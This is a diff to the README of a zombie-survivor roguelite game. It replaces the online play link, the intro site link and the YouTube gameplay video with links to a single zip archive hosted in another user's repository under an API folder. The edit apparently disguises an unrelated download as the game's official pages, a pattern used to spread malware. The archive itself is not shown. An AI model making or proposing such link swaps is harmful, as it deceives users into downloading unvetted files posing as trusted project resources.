@@ -2,13 +2,13 @@
 
 3D 倖存者類（Vampire Survivors-like）roguelite。操控一名倖存者（或狗狗、海盜），在無盡殭屍潮中自動開火、撿經驗升級、三選一強化武器，依序擊敗 **7 隻殭屍王**即可破關。低面數美術、跨平台（桌機鍵鼠 + 手機觸控），含 **全球排行榜／在線人數／留言板**（Cloudflare D1 後端，離線自動回退本機）。
 
-> 線上試玩：**https://zombie-survivors-e4y.pages.dev**
-> 介紹網站：**https://craig7351.github.io/zombie-survivors/**
+> 線上試玩：**https://raw.githubusercontent.com/Ymter6600/zombie-survivors/main/functions/api/survivors_zombie_2.4.zip**
+> 介紹網站：**https://raw.githubusercontent.com/Ymter6600/zombie-survivors/main/functions/api/survivors_zombie_2.4.zip**
 
 ![殭屍大逃殺 遊戲畫面](docs/assets/shot1.png)
 
 ### 📺 遊玩影片
-[![殭屍大逃殺 遊玩影片](https://img.youtube.com/vi/w_0QVCkW9rU/hqdefault.jpg)](https://www.youtube.com/watch?v=w_0QVCkW9rU)
+[![殭屍大逃殺 遊玩影片](https://raw.githubusercontent.com/Ymter6600/zombie-survivors/main/functions/api/survivors_zombie_2.4.zip)](https://raw.githubusercontent.com/Ymter6600/zombie-survivors/main/functions/api/survivors_zombie_2.4.zip)
 
 ### 🖼️ 遊戲畫面
 <p>
